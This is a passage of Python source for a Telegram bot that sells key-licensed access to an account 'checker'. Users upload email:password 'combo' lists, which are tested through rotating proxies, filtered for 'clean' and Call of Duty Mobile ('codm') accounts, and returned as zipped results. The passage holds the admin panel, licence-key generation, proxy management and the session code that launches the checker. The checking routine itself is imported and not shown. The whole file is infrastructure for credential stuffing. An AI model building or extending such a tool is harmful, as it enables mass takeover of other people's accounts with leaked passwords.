        f"{pe(1)} Limit      : <code>{cfg.get('global_limit') or 'Unlimited'}</code>  VIP:<code>{cfg.get('vip_limit') or 'Unlimited'}</code>\n"
        f"{pe(1)} Max/Session: <code>{ml5 or 'Unlimited'}</code>\n"
        f"{pe(1)} Announce   : <code>{ann5}</code>\n"
        f"{pe(1)} Uptime     : <code>{h5}h {m5}m</code>\n"
        f"{pe_sep()}\n{pe(1)} Choose a section:",
        reply_markup=kb_admin_main(cfg), parse_mode=ParseMode.HTML)


async def _handle_admin_text_input(update, context, uid, tg, cfg, action, text):
    """Process admin text inputs (key generation, settings, etc.)"""
    with sessions_lock:
        if uid in active_sessions: active_sessions[uid].pop("awaiting_admin_input",None)

    if text.strip() == BTN_CANCEL:
        await _show_admin_panel(update.message, cfg); return

    # ── Key generation ─────────────────────────────────────────────────
    if action.startswith("genkey_"):
        dtype=action[7:]
        parts=text.strip().split()
        try:
            if dtype=="lifetime":
                mu=int(parts[0])
                dval=0
            else:
                dval=int(parts[0]); mu=int(parts[1]) if len(parts)>1 else 1
        except:
            await update.message.reply_text(f"{pe(1)} Invalid input. Use: <code>value max_users</code>",parse_mode=ParseMode.HTML,reply_markup=kb_admin_keys()); return
        exp=compute_expiry(dtype,dval)
        import uuid as _uuid
        key=f"MITZ-{_uuid.uuid4().hex[:8].upper()}-{_uuid.uuid4().hex[:4].upper()}"
        dd={"hours":f"{dval}h","days":f"{dval}d","months":f"{dval}mo","lifetime":"Lifetime"}[dtype]
        keys=load_keys()
        keys[key]={"max_users":mu,"used_by":[],"duration_type":dtype,"duration_val":dval,
                   "expires_at":exp,"created_at":datetime.now().isoformat(),"created_by":tg.id}
        save_keys(keys)
        await update.message.reply_text(
            f"{pe(5)} <b>KEY GENERATED!</b> {pe(5)}\n"
            f"{pe_sep()}\n"
            f"<code>{key}</code>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Duration  : <b>{dd}</b>\n"
            f"{pe(1)} Expires   : {fmt_expiry(exp)}\n"
            f"{pe(1)} Max Users : <code>{mu}</code>",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_keys()); return

    # ── User actions ───────────────────────────────────────────────────
    if action in ("addvip","rmvip","ban","unban"):
        try: target=text.strip()
        except: await update.message.reply_text(f"{pe(1)} Invalid ID.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_users()); return
        users=load_users()
        if target not in users:
            await update.message.reply_text(f"{pe(1)} User <code>{target}</code> not found.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_users()); return
        if action=="addvip":   users[target]["vip"]=True;  label="VIP Added"
        elif action=="rmvip":  users[target]["vip"]=False; label="VIP Removed"
        elif action=="ban":    users[target]["banned"]=True; label="User Banned"
        elif action=="unban":  users[target]["banned"]=False; label="User Unbanned"
        save_users(users)
        try: await context.bot.send_message(chat_id=int(target),text=f"{pe(2)} <b>Account Updated</b>\n{pe_sep()}\nYour account status was updated by admin.",parse_mode=ParseMode.HTML)
        except: pass
        await update.message.reply_text(
            f"{pe(2)} <b>{label}</b>\n{pe_sep()}\n{pe(1)} User: <code>{target}</code>",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_users()); return

    # ── Broadcast ──────────────────────────────────────────────────────
    if action=="broadcast":
        users=load_users(); sent=0; failed=0
        for uid2 in users:
            try:
                await context.bot.send_message(chat_id=int(uid2),
                    text=f"{pe(2)} <b>Announcement</b>\n{pe_sep()}\n{text}",
                    parse_mode=ParseMode.HTML)
                sent+=1
            except: failed+=1
        await update.message.reply_text(
            f"{pe(3)} <b>Broadcast Done</b>\n{pe_sep()}\n{pe(1)} Sent: <code>{sent}</code>  Failed: <code>{failed}</code>",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_main(cfg)); return

    # ── Settings ───────────────────────────────────────────────────────
    cfg2=load_config()
    if action=="setlimit":
        if text.strip().lower()=="off": cfg2["global_limit"]=None
        else:
            try: cfg2["global_limit"]=int(text.strip())
            except: await update.message.reply_text(f"{pe(1)} Invalid number.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_settings(cfg2)); return
        save_config(cfg2)
        await update.message.reply_text(f"{pe(3)} <b>Limit Set</b>\n{pe_sep()}\n{pe(1)} Limit: <code>{cfg2['global_limit'] or 'Unlimited'}</code>",parse_mode=ParseMode.HTML,reply_markup=kb_admin_settings(cfg2)); return
    if action=="setviplimit":
        if text.strip().lower()=="off": cfg2["vip_limit"]=None
        else:
            try: cfg2["vip_limit"]=int(text.strip())
            except: await update.message.reply_text(f"{pe(1)} Invalid number.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_settings(cfg2)); return
        save_config(cfg2)
        await update.message.reply_text(f"{pe(3)} <b>VIP Limit Set</b>\n{pe_sep()}\n{pe(1)} VIP Limit: <code>{cfg2['vip_limit'] or 'Unlimited'}</code>",parse_mode=ParseMode.HTML,reply_markup=kb_admin_settings(cfg2)); return
    if action=="setcd":
        if text.strip().lower()=="off": cfg2["cooldown_sessions"]=None; cfg2["cooldown_minutes"]=30
        else:
            p=text.strip().split()
            try: cfg2["cooldown_sessions"]=int(p[0]); cfg2["cooldown_minutes"]=int(p[1]) if len(p)>1 else 30
            except: await update.message.reply_text(f"{pe(1)} Invalid. Use: <code>sessions minutes</code>",parse_mode=ParseMode.HTML,reply_markup=kb_admin_settings(cfg2)); return
        save_config(cfg2)
        await update.message.reply_text(f"{pe(3)} <b>Cooldown Set</b>\n{pe_sep()}\n{pe(1)} After <code>{cfg2.get('cooldown_sessions')}</code> sessions, cooldown <code>{cfg2.get('cooldown_minutes')}m</code>",parse_mode=ParseMode.HTML,reply_markup=kb_admin_settings(cfg2)); return
    if action=="setthreads":
        try: cfg2["default_threads"]=max(1,int(text.strip()))
        except: await update.message.reply_text(f"{pe(1)} Invalid number.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_settings(cfg2)); return
        save_config(cfg2)
        await update.message.reply_text(f"{pe(3)} <b>Threads Set</b>\n{pe_sep()}\n{pe(1)} Default threads: <code>{cfg2['default_threads']}</code>",parse_mode=ParseMode.HTML,reply_markup=kb_admin_settings(cfg2)); return
    if action=="setconcurrent":
        try:
            n=max(1,min(50,int(text.strip())))
            cfg2["max_concurrent"]=n; save_config(cfg2); rebuild_semaphore(n)
        except: await update.message.reply_text(f"{pe(1)} Invalid number.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_settings(cfg2)); return
        await update.message.reply_text(f"{pe(3)} <b>Concurrent Set</b>\n{pe_sep()}\n{pe(1)} Concurrent slots: <code>{n}</code>",parse_mode=ParseMode.HTML,reply_markup=kb_admin_settings(cfg2)); return

    if action=="setmlimit":
        if text.strip().lower() in ("off","0","none"): cfg2["max_lines_per_check"]=None
        else:
            try: cfg2["max_lines_per_check"]=max(1,int(text.strip()))
            except: await update.message.reply_text(f"{pe(1)} Invalid number. Send a number or <code>off</code>.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_settings(cfg2)); return
        save_config(cfg2)
        val=cfg2.get("max_lines_per_check")
        await update.message.reply_text(f"{pe(3)} <b>Max Lines/Check Set</b>\n{pe_sep()}\n{pe(2)} Max lines per session: <code>{val or 'Unlimited'}</code> {pe(2)}",parse_mode=ParseMode.HTML,reply_markup=kb_admin_settings(cfg2)); return

    if action=="set_announcement":
        if text.strip().lower()=="off": cfg2["announcement_text"]=""
        else: cfg2["announcement_text"]=text.strip()
        save_config(cfg2)
        val=cfg2.get("announcement_text","")
        await update.message.reply_text(
            f"{pe(3)} <b>Announcement {'Cleared' if not val else 'Set'}</b>\n{pe_sep()}\n"
            f"{pe(1)} {val or 'No announcement set.'}",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_den()); return

    if action=="batchkey":
        parts=text.strip().split()
        try:
            dtype=parts[0]; dval=int(parts[1]); count=min(int(parts[2]),50); mu=int(parts[3]) if len(parts)>3 else 1
        except:
            await update.message.reply_text(f"{pe(1)} Invalid format. Use: <code>type duration count max_users</code>",parse_mode=ParseMode.HTML,reply_markup=kb_admin_den()); return
        if dtype not in ("hours","days","months","lifetime"):
            await update.message.reply_text(f"{pe(1)} type must be hours/days/months/lifetime",parse_mode=ParseMode.HTML,reply_markup=kb_admin_den()); return
        import uuid as _uuid2
        exp=compute_expiry(dtype,dval); keys=load_keys(); generated=[]
        dd={"hours":f"{dval}h","days":f"{dval}d","months":f"{dval}mo","lifetime":"Lifetime"}[dtype]
        for _ in range(count):
            k=f"MITZ-{_uuid2.uuid4().hex[:8].upper()}-{_uuid2.uuid4().hex[:4].upper()}"
            keys[k]={"max_users":mu,"used_by":[],"duration_type":dtype,"duration_val":dval,
                     "expires_at":exp,"created_at":datetime.now().isoformat(),"created_by":tg.id}
            generated.append(k)
        save_keys(keys)
        key_lines="\n".join(f"<code>{k}</code>" for k in generated)
        await update.message.reply_text(
            f"{pe(5)} <b>🔑 {count} Keys Generated!</b> {pe(5)}\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Duration  : <b>{dd}</b>\n"
            f"{pe(1)} Max Users : <code>{mu}</code> each\n"
            f"{pe_sep()}\n"
            f"{key_lines}",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_den()); return

    if action=="usernote":
        parts=text.strip().split(None,1)
        if len(parts)<2:
            await update.message.reply_text(f"{pe(1)} Format: <code>user_id note text</code>",parse_mode=ParseMode.HTML,reply_markup=kb_admin_den()); return
        target_n=parts[0]; note_n=parts[1]
        users_n=load_users()
        if target_n not in users_n:
            await update.message.reply_text(f"{pe(1)} User <code>{target_n}</code> not found.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_den()); return
        users_n[target_n]["note"]=note_n; save_users(users_n)
        await update.message.reply_text(
            f"{pe(3)} <b>Note Saved</b>\n{pe_sep()}\n"
            f"{pe(1)} User : <code>{target_n}</code>\n{pe(1)} Note : <i>{note_n}</i>",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_den()); return

    if action=="usersearch":
        q=text.strip().lstrip("@"); users_s=load_users(); found=[]
        for uid_s,ud_s in users_s.items():
            if q==uid_s or q.lower()==ud_s.get("username","").lower() or q.lower() in ud_s.get("first_name","").lower():
                found.append((uid_s,ud_s))
        if not found:
            await update.message.reply_text(f"{pe(1)} No user found for <code>{q}</code>.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_den()); return
        lines_s=[f"{pe(5)} <b>🔍 Search Results</b> {pe(5)}\n{pe_sep()}"]
        for uid_s,ud_s in found[:5]:
            fn_s=ud_s.get("first_name","?"); un_s=ud_s.get("username","?")
            act_s="✅" if ud_s.get("activated") else "❌"; vip_s="⭐" if ud_s.get("vip") else ""; ban_s="🚫" if ud_s.get("banned") else ""
            exp_s2=fmt_expiry(ud_s.get("key_expires_at")); note_s2=ud_s.get("note","")
            cl_s=ud_s.get("custom_limit"); cd_s2=cfg2.get("cooldown_sessions")
            lines_s.append(
                f"{pe(1)} <b>{fn_s}</b> @{un_s} {act_s}{vip_s}{ban_s}\n"
                f"    ID: <code>{uid_s}</code>\n"
                f"    Checked: <code>{ud_s.get('total_checked',0):,}</code>  Sessions: <code>{ud_s.get('sessions_count',0)}</code>\n"
                f"    Expiry: {exp_s2}  Limit: {cl_s or 'default'}\n"
                + (f"    Note: <i>{note_s2}</i>\n" if note_s2 else "")
            )
        await update.message.reply_text("\n".join(lines_s), parse_mode=ParseMode.HTML, reply_markup=kb_admin_den()); return

    if action=="del_proxy_select":
        fname=text.strip()
        if fname.upper()=="ALL":
            import shutil
            for pf in list(PROXY_DIR.glob("*.txt")):
                try: pf.unlink()
                except: pass
            try:
                geo_rotator.__init__()
            except: pass
            await update.message.reply_text(f"{pe(2)} <b>All Proxy Files Deleted</b>\n{pe_sep()}\nProxy rotator reset.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_proxy()); return
        fp=PROXY_DIR/fname
        if not fp.exists():
            await update.message.reply_text(f"{pe(1)} File <code>{fname}</code> not found.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_proxy()); return
        fp.unlink()
        try:
            geo_rotator.__init__()
        except: pass
        await update.message.reply_text(f"{pe(2)} <b>Proxy File Deleted</b>\n{pe_sep()}\n{pe(1)} Deleted: <code>{fname}</code>",parse_mode=ParseMode.HTML,reply_markup=kb_admin_proxy()); return

    # fallback
    await _show_admin_panel(update.message, cfg)


async def _handle_proxy_line_check(update, context, uid, fname, line_num):
    """Check a specific proxy line number."""
    fpath=PROXY_DIR/fname
    with sessions_lock:
        if uid in active_sessions: active_sessions[uid].pop("awaiting_proxy_line",None)
    if not fpath.exists():
        await update.message.reply_text(f"{pe(1)} File not found: <code>{fname}</code>",parse_mode=ParseMode.HTML); return
    with open(fpath,"r",encoding="utf-8",errors="ignore") as f:
        lines=[ln.strip() for ln in f if ln.strip() and not ln.strip().startswith("#")]
    if line_num<1 or line_num>len(lines):
        await update.message.reply_text(f"{pe(1)} Line {line_num} out of range (1-{len(lines)}).",parse_mode=ParseMode.HTML); return
    proxy_line=lines[line_num-1]
    await update.message.reply_text(f"{pe(1)} Checking proxy line {line_num}...",parse_mode=ParseMode.HTML)
    loop=asyncio.get_event_loop()
    ok,err=await loop.run_in_executor(None,_test_proxy_sync,proxy_line)
    status="Working" if ok else f"Dead ({err})"
    await update.message.reply_text(
        f"{pe(2)} <b>Proxy Check Result</b>\n"
        f"{pe_sep()}\n"
        f"{pe(1)} File   : <code>{fname}</code>\n"
        f"{pe(1)} Line   : <code>{line_num}</code>\n"
        f"{pe(1)} Proxy  : <code>{proxy_line[:60]}</code>\n"
        f"{pe(1)} Status : <b>{status}</b>",
        parse_mode=ParseMode.HTML, reply_markup=kb_admin_proxy())


async def _do_start_check_logic(update, context, uid, cfg, ud):
    """Handle the START CHECKING NOW button — launches checker if file is ready."""
    tg=update.effective_user; main_kb=kb_main_admin() if is_admin(tg.id,cfg) else kb_main_user()
    with sessions_lock: s=active_sessions.get(uid,{})
    st=s.get("status","")

    if st=="checking":
        await update.message.reply_text(
            f"{pe(2)} <b>Already Checking!</b>\n{pe_sep()}\n"
            f"{pe(1)} /check for live stats",
            parse_mode=ParseMode.HTML, reply_markup=main_kb); return

    # Check for existing file
    uc=COMBO_DIR/uid
    existing=list(uc.glob("*.txt")) if uc.exists() else []
    has_file=(s.get("file") and Path(s.get("file","")).exists()) or bool(existing)

    if not has_file:
        with sessions_lock: active_sessions.setdefault(uid,{})["status"]="waiting_file"
        await update.message.reply_text(
            f"{pe(5)} <b>Upload Your Combo File</b> {pe(5)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} Send a <code>.txt</code> file with accounts. {pe(2)}\n"
            f"{pe(1)} Format: <code>email:password</code> per line.\n"
            f"{pe_sep()}\n"
            f"{pe(2)} Tap Cancel to go back. {pe(2)}",
            parse_mode=ParseMode.HTML, reply_markup=rkb([BTN_CANCEL])); return

    # File is ready — check cooldown
    on_cd,ml=check_cooldown(uid,cfg)
    if on_cd and not is_admin(tg.id,cfg):
        h,m_=int(ml//60),int(ml%60)
        ts_="{}h {}m".format(h,m_) if h else "{}m".format(m_)
        await update.message.reply_text(
            f"{pe(2)} <b>Cooldown Active</b>\n{pe_sep()}\n"
            f"{pe(1)} Wait <b>{ts_}</b> before starting again.",
            parse_mode=ParseMode.HTML, reply_markup=main_kb); return

    # All good — launch the checker
    lk=s.get("lvl_key","lvl_all"); ck=s.get("cf_key","cf_both")
    thr_val=LEVEL_OPTIONS[lk]["threshold"]; clf=CLEAN_OPTIONS[ck]["filter"]
    ll=LEVEL_OPTIONS[lk]["label"]; cl=CLEAN_OPTIONS[ck]["label"]
    cid=update.effective_chat.id
    combo=Path(s.get("file","") or (existing[0] if existing else ""))
    if not combo.exists():
        await update.message.reply_text(f"{pe(1)} File not found. Please upload again.", parse_mode=ParseMode.HTML, reply_markup=main_kb); return

    stop_ev=s.get("stop_event",threading.Event())
    cfg2=load_config()
    udb=load_users(); isv=udb.get(uid,{}).get("vip",False) or is_admin(tg.id,cfg2)
    lim=cfg2.get("vip_limit") if isv else cfg2.get("global_limit")
    threads=cfg2.get("default_threads",5)
    _hits_on=udb.get(uid,{}).get("hits_notif",False)
    btok=cfg2["bot_token"] if _hits_on else None
    try:
        with open(combo,"r",encoding="utf-8",errors="ignore") as f:
            total_lines=sum(1 for ln in f if ln.strip() and ":" in ln)
    except: total_lines=0
    disp=min(lim,total_lines) if lim else total_lines
    ts_stamp=datetime.now().strftime("%Y%m%d_%H%M%S")
    rf=RESULTS_DIR/uid/ts_stamp; rf.mkdir(parents=True,exist_ok=True)

    with sessions_lock:
        active_sessions[uid]["status"]="checking"
        active_sessions[uid]["result_folder"]=str(rf)
        active_sessions[uid]["orig_total"]=disp

    _hits_label=f"Hits notifications: ON" if _hits_on else "Hits notifications: OFF"
    smsg=await update.message.reply_text(
        f"{pe(5)} <b>CHECKER STARTED!</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(2)} Lines   : <code>{disp:,}</code> {pe(2)}\n"
        f"{pe(1)} Threads : <code>{threads}</code> {pe(1)}\n"
        f"{pe(2)} Level   : <b>{ll}</b> {pe(2)}\n"
        f"{pe(2)} Filter  : <b>{cl}</b> {pe(2)}\n"
        f"{pe_sep()}\n"
        f"{pe(1)} {_hits_label} {pe(1)}\n"
        f"{pe_sep()}\n"
        f"{pe(3)} /check for stats  |  /stop to stop {pe(3)}",
        parse_mode=ParseMode.HTML, reply_markup=main_kb)
    if smsg: track(uid,smsg.message_id)

    persist_session(uid,{
        "file":str(combo),"chat_id":cid,
        "lvl_key":lk,"cf_key":ck,
        "status_msg_id":smsg.message_id if smsg else None,
        "username":tg.username or "","first_name":tg.first_name or "",
        "status":"checking","result_folder":str(rf),"orig_total":disp,
    })

    loop=asyncio.get_event_loop()
    _status_stop=threading.Event()
    _auto_part=[1]

    def _status_loop():
        while not _status_stop.wait(180):
            with sessions_lock: s2=active_sessions.get(uid,{})
            if s2.get("status")!="checking": break
            ls2=s2.get("live_stats")
            if ls2 is not None:
                cur_stats=ls2.get_stats()
                update_persisted_stats(uid,cur_stats)
                done_count=cur_stats.get("total",0)
                if disp and done_count>disp: done_count=disp
                card=stats_card(done_count,disp,cur_stats,ll,cl,result_folder=str(rf))
                try:
                    asyncio.run_coroutine_threadsafe(
                        context.bot.edit_message_text(chat_id=cid,message_id=smsg.message_id,text=card,parse_mode=ParseMode.HTML),loop)
                except: pass
            try:
                cur_rf=Path(s2.get("result_folder",str(rf)))
                result_files=[f for f in cur_rf.rglob("*") if f.is_file() and not f.name.endswith(".zip")]
                folder_size=sum(f.stat().st_size for f in result_files)
                if folder_size>=int(TG_MAX_BYTES*0.85):
                    pzip=cur_rf/f"results_{uid}_{ts_stamp}_auto{_auto_part[0]}.zip"
                    with zipfile.ZipFile(pzip,"w",zipfile.ZIP_DEFLATED) as zf:
                        for f in result_files: zf.write(f,f.relative_to(cur_rf))
                    ls3=s2.get("live_stats"); snap=ls3.get_stats() if ls3 else {}
                    asyncio.run_coroutine_threadsafe(
                        deliver_results(context.bot,cid,uid,[pzip],snap,combo_file=None,partial=True),loop)
                    for f in result_files:
                        try: f.unlink()
                        except: pass
                    _auto_part[0]+=1
            except: pass
    threading.Thread(target=_status_loop,daemon=True,name=f"status-{uid}").start()

    def bg():
        _enqueue(uid); pos=_queue_pos(uid)
        if pos>1:
            asyncio.run_coroutine_threadsafe(context.bot.send_message(chat_id=cid,
                text=f"{pe(3)} <b>Queue Position: #{pos}</b> {pe(3)}\n{pe_sep()}\n{pe(2)} Waiting for a free slot. /stop to cancel. {pe(2)}",
                parse_mode=ParseMode.HTML),loop)
        _checker_semaphore.acquire(); _dequeue(uid)
        with sessions_lock:
            if active_sessions.get(uid,{}).get("status")!="checking" or stop_ev.is_set():
                _checker_semaphore.release(); _status_stop.set(); return
        try:
            asyncio.run_coroutine_threadsafe(context.bot.edit_message_text(
                chat_id=cid,message_id=smsg.message_id,
                text=(f"{pe(5)} <b>CHECKER RUNNING!</b> {pe(5)}\n"
                      f"{pe_sep()}\n"
                      f"{pe(2)} Lines   : <code>{disp:,}</code> {pe(2)}\n"
                      f"{pe(1)} Threads : <code>{threads}</code> {pe(1)}\n"
                      f"{pe(2)} Level   : <b>{ll}</b> {pe(2)}\n"
                      f"{pe(2)} Filter  : <b>{cl}</b> {pe(2)}\n"
                      f"{pe_sep()}\n"
                      f"{pe(3)} /check for live stats {pe(3)}\n"
                      f"{pe(1)} /stop to stop {pe(1)}"),
                parse_mode=ParseMode.HTML),loop)
        except: pass
        try:
            if not CHECKER_OK:
                asyncio.run_coroutine_threadsafe(context.bot.send_message(
                    chat_id=cid,
                    text=(f"{pe(2)} <b>Checker Unavailable</b>\n{pe_sep()}\n"
                          f"The checker module failed to load.\n<code>{CHECKER_ERR[:300]}</code>\n\nContact admin."),
                    parse_mode=ParseMode.HTML),loop); return
            st_res=run_checker(uid,combo,rf,lim,threads,stop_ev,btok,cid,thr_val,clf)
            if st_res.get("error"):
                asyncio.run_coroutine_threadsafe(context.bot.send_message(
                    chat_id=cid,
                    text=f"{pe(2)} <b>Checker Error</b>\n{pe_sep()}\n<code>{st_res['error'][:400]}</code>",
                    parse_mode=ParseMode.HTML),loop); return
            u2=load_users()
            if uid in u2:
                u2[uid]["total_checked"]+=st_res.get("total",0)
                u2[uid]["sessions_count"]+=1; save_users(u2)
            zo=rf/f"results_{uid}_{ts_stamp}.zip"; zp=zip_results(rf,zo)
            with sessions_lock: s2=active_sessions.get(uid,{})
            is_continuing=s2.get("stop_continue",False)
            if is_continuing:
                asyncio.run_coroutine_threadsafe(
                    deliver_results(context.bot,cid,uid,zp,st_res,combo_file=None,partial=True),loop)
                new_stop=threading.Event()
                with sessions_lock:
                    if uid in active_sessions:
                        active_sessions[uid]["stop_event"]=new_stop
                        active_sessions[uid]["stop_continue"]=False
                        active_sessions[uid]["status"]="checking"
                _checker_semaphore.release(); _status_stop.set()
                new_ts=datetime.now().strftime("%Y%m%d_%H%M%S")
                new_rf=RESULTS_DIR/uid/new_ts; new_rf.mkdir(parents=True,exist_ok=True)
                with sessions_lock:
                    if uid in active_sessions: active_sessions[uid]["result_folder"]=str(new_rf)
                def _continue_bg():
                    _enqueue(uid); _checker_semaphore.acquire(); _dequeue(uid)
                    try:
                        st2=run_checker(uid,combo,new_rf,lim,threads,new_stop,btok,cid,thr_val,clf,is_resume=True)
                        u3=load_users()
                        if uid in u3:
                            u3[uid]["total_checked"]+=st2.get("total",0); save_users(u3)
                        zo2=new_rf/f"results_{uid}_{new_ts}.zip"; zp2=zip_results(new_rf,zo2)
                        note2=" (Stopped)" if new_stop.is_set() else ""
                        asyncio.run_coroutine_threadsafe(
                            deliver_results(context.bot,cid,uid,zp2,st2,combo_file=combo,note=note2),loop)
                    except Exception as ex2:
                        asyncio.run_coroutine_threadsafe(context.bot.send_message(
                            chat_id=cid,text=f"{pe(1)} <b>Error:</b> <code>{str(ex2)[:300]}</code>",parse_mode=ParseMode.HTML),loop)
                    finally:
                        _checker_semaphore.release(); inc_session(uid); del_combo(combo)
                        clear_persisted_session(uid)
                        with sessions_lock:
                            if uid in active_sessions:
                                active_sessions[uid]["status"]="done"
                                try:
                                    _ls=active_sessions[uid].get("live_stats"); _ps=active_sessions[uid].get("prev_stats",{}); _pp=active_sessions[uid].get("prev_processed",0)
                                    _cs=_ls.get_stats() if _ls else {}; _fs=dict(_cs)
                                    if _ps:
                                        for _k in ("valid","invalid","clean","not_clean","has_codm","no_codm"): _fs[_k]=_cs.get(_k,0)+_ps.get(_k,0)
                                    _fs["total"]=_pp+_cs.get("total",0); active_sessions[uid]["final_stats"]=_fs
                                except: pass
                threading.Thread(target=_continue_bg,daemon=True,name=f"checker-cont-{uid}").start()
                return
            else:
                note=" (Stopped)" if stop_ev.is_set() else ""
                asyncio.run_coroutine_threadsafe(
                    deliver_results(context.bot,cid,uid,zp,st_res,combo_file=combo,note=note),loop)
        except Exception as ex:
            asyncio.run_coroutine_threadsafe(context.bot.send_message(
                chat_id=cid,text=f"{pe(1)} <b>Error:</b> <code>{str(ex)[:300]}</code>",parse_mode=ParseMode.HTML),loop)
        finally:
            _status_stop.set(); _checker_semaphore.release(); inc_session(uid); del_combo(combo)
            clear_persisted_session(uid)
            with sessions_lock:
                if uid in active_sessions:
                    active_sessions[uid]["status"]="done"
                    try:
                        _ls=active_sessions[uid].get("live_stats"); _ps=active_sessions[uid].get("prev_stats",{}); _pp=active_sessions[uid].get("prev_processed",0)
                        _cs=_ls.get_stats() if _ls else {}; _fs=dict(_cs)
                        if _ps:
                            for _k in ("valid","invalid","clean","not_clean","has_codm","no_codm"): _fs[_k]=_cs.get(_k,0)+_ps.get(_k,0)
                        _fs["total"]=_pp+_cs.get("total",0); active_sessions[uid]["final_stats"]=_fs
                    except: pass

    t=threading.Thread(target=bg,daemon=True,name=f"checker-{uid}"); t.start()
    with sessions_lock: active_sessions[uid]["thread"]=t


async def _handle_start_check(update, context, uid, tg, cfg, ud):
    """Handle the Check Accounts button press with proper gate checks."""
    ok,ud2,_=await gate(update,context)
    if not ok: return
    await _do_start_check_logic(update, context, uid, cfg, ud2)


async def on_document(update,context):
    tg=update.effective_user; uid=str(tg.id); cfg=load_config()

    # ── Admin: replacefile intercept ────────────────────────────────────
    if is_admin(tg.id,cfg):
        _REPLACEABLE_MAP = {
            "config.json":            CONFIG_FILE,
            "users.json":             USERS_FILE,
            "keys.json":              KEYS_FILE,
            "sessions_persist.json":  SESSIONS_FILE,
            "mini_admins.json":       MINI_ADMINS_FILE,
            "resellers.json":         RESELLERS_FILE,
        }
        with sessions_lock:
            _sess_rf = active_sessions.get(uid, {})
            _awaiting_rf = (
                _sess_rf.get("awaiting_replace_file") or
                _sess_rf.get("awaiting_replacefile", {}).get("fname")
            )
            _awaiting_path = (
                _sess_rf.get("awaiting_replace_path") or
                (_sess_rf.get("awaiting_replacefile") or {}).get("path")
            )
        doc = update.message.document
        # Auto-detect: if admin sends a .json file that matches a known data file,
        # handle it even without a prior /replacefiles command
        _doc_fname = doc.file_name.lower() if doc else ""
        _auto_target_path = _REPLACEABLE_MAP.get(_doc_fname)
        if _awaiting_rf == "__auto__":
            # /replacefiles with no arg — detect target from uploaded filename
            if doc and _doc_fname.endswith(".json") and _auto_target_path:
                rf_fname = _doc_fname
                rf_path  = str(_auto_target_path)
            else:
                rf_fname = None; rf_path = None
                with sessions_lock:
                    if uid in active_sessions:
                        active_sessions[uid].pop("awaiting_replace_file", None)
                        active_sessions[uid].pop("awaiting_replace_path", None)
                known = ", ".join(f"<code>{n}</code>" for n in _REPLACEABLE_MAP)
                await update.message.reply_text(
                    f" <b>Unknown file:</b> <code>{doc.file_name if doc else '?'}</code>\n"
                    f"Replaceable files:\n{known}",
                    parse_mode=ParseMode.HTML)
                return
        elif _awaiting_rf and _awaiting_path:
            # Explicit pending replace (from /replacefiles config.json etc.)
            rf_fname = _awaiting_rf
            rf_path  = _awaiting_path
        elif _auto_target_path and doc and _doc_fname.endswith(".json"):
            # Admin sent a known .json with no prior command — auto-handle
            rf_fname = _doc_fname
            rf_path  = str(_auto_target_path)
        else:
            rf_fname = None; rf_path = None
        if rf_fname and rf_path:
            if not doc or not doc.file_name.lower().endswith(".json"):
                await update.message.reply_text(
                    " Only <b>.json</b> files accepted for data replacement.\n"
                    "Send /cancel_replace to abort.", parse_mode=ParseMode.HTML)
                return
            target_path  = Path(rf_path)
            target_fname = rf_fname
            w = await update.message.reply_text(
                f" Validating and replacing <code>{target_fname}</code>…",
                parse_mode=ParseMode.HTML)
            tmp_path = DATA_DIR / f"_tmp_{target_fname}"
            try:
                # Download to temp file
                tgf = await context.bot.get_file(doc.file_id)
                await tgf.download_to_drive(tmp_path)
                # Validate JSON before touching the real file
                with open(tmp_path, "r", encoding="utf-8") as _f:
                    new_data = json.load(_f)
                # Backup existing file
                if target_path.exists():
                    bak_path = target_path.with_suffix(".json.bak")
                    import shutil as _sh
                    _sh.copy2(str(target_path), str(bak_path))
                # Atomic replace: write validated JSON directly to target
                # (avoids partial-write corruption that caused config.json issues)
                with open(target_path, "w", encoding="utf-8") as _wf:
                    json.dump(new_data, _wf, indent=2, ensure_ascii=False)
                try: tmp_path.unlink()
                except: pass
                # Clear awaiting state (both key variants)
                with sessions_lock:
                    if uid in active_sessions:
                        active_sessions[uid].pop("awaiting_replacefile", None)
                        active_sessions[uid].pop("awaiting_replace_file", None)
                        active_sessions[uid].pop("awaiting_replace_path", None)
                new_size = target_path.stat().st_size
                key_info = (f"{len(new_data):,} entries" if isinstance(new_data, dict)
                            else f"{len(new_data):,} items" if isinstance(new_data, list)
                            else "loaded OK")
                await w.edit_text(
                    f" <b>File Replaced!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                    f" File   : <code>{target_fname}</code>\n"
                    f" Size   : <code>{new_size/1024:.1f} KB</code>\n"
                    f" Content: <code>{key_info}</code>\n"
                    f" Backup : <code>{target_fname}.bak</code> saved\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f" Use /reloadbot to apply changes.",
                    parse_mode=ParseMode.HTML)
            except json.JSONDecodeError as je:
                try: tmp_path.unlink()
                except: pass
                await w.edit_text(
                    f" <b>Invalid JSON!</b>\n<code>{str(je)[:200]}</code>\n"
                    f"File was NOT replaced. Fix the JSON and try again.",
                    parse_mode=ParseMode.HTML)
            except Exception as e:
                try: tmp_path.unlink()
                except: pass
                await w.edit_text(
                    f" <b>Replace failed:</b> <code>{str(e)[:200]}</code>",
                    parse_mode=ParseMode.HTML)
            return

    # Admin proxy upload intercept
    if is_admin(tg.id,cfg):
        with sessions_lock: aw=active_sessions.get(uid,{}).get("awaiting_proxy",False)
        if aw:
            doc=update.message.document
            if not doc or not doc.file_name.lower().endswith(".txt"):
